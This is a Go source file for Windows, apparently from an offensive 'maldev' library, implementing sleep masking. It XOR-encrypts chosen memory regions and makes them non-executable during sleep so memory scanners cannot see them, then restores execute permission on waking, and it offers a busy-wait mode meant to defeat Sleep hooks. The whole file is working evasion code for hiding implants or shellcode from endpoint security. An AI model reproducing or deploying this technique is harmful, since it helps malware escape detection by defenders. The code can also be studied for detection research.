//go:build windows

package sleepmask

import (
	"crypto/rand"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/timing"
)

// Region describes a memory region to encrypt during sleep.
type Region struct {
	Addr uintptr
	Size uintptr
}

// SleepMethod controls how the sleep is performed.
type SleepMethod int

const (
	// MethodNtDelay uses NtDelayExecution (standard, hookable).
	MethodNtDelay SleepMethod = iota
	// MethodBusyTrig uses CPU-burn trigonometric busy wait (defeats Sleep hooks).
	MethodBusyTrig
)

// Mask manages encrypted sleep for a set of memory regions.
type Mask struct {
	regions []Region
	method  SleepMethod
}

// New creates a Mask for the given memory regions.
func New(regions ...Region) *Mask {
	return &Mask{regions: regions, method: MethodNtDelay}
}

// WithMethod sets the sleep method.
func (m *Mask) WithMethod(method SleepMethod) *Mask {
	m.method = method
	return m
}

// Sleep encrypts all registered regions, sleeps for the given duration,
// then decrypts and restores executable permissions.
//
// During sleep:
//   - All regions are XOR-encrypted with a random 32-byte key
//   - Page permissions are downgraded to PAGE_READWRITE (not executable)
//   - Memory scanners see encrypted, non-executable data
//
// After waking:
//   - Regions are decrypted (same XOR)
//   - Page permissions are restored to PAGE_EXECUTE_READ
func (m *Mask) Sleep(d time.Duration) {
	if len(m.regions) == 0 || d <= 0 {
		return
	}

	// Generate random XOR key.
	key := make([]byte, 32)
	rand.Read(key)

	// Encrypt + downgrade permissions.
	for _, r := range m.regions {
		xorRegion(r.Addr, r.Size, key)
		var old uint32
		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &old)
	}

	// Sleep.
	switch m.method {
	case MethodBusyTrig:
		timing.BusyWaitTrig(d)
	default:
		time.Sleep(d)
	}

	// Decrypt + restore executable permissions.
	for _, r := range m.regions {
		var old uint32
		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &old)
		xorRegion(r.Addr, r.Size, key)
		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_EXECUTE_READ, &old)
	}

	// Zero the key from memory.
	for i := range key {
		key[i] = 0
	}
}

// xorRegion applies repeating-key XOR to a memory region in-place.
func xorRegion(addr, size uintptr, key []byte) {
	keyLen := uintptr(len(key))
	for i := uintptr(0); i < size; i++ {
		ptr := (*byte)(unsafe.Pointer(addr + i))
		*ptr ^= key[i%keyLen]
	}
}
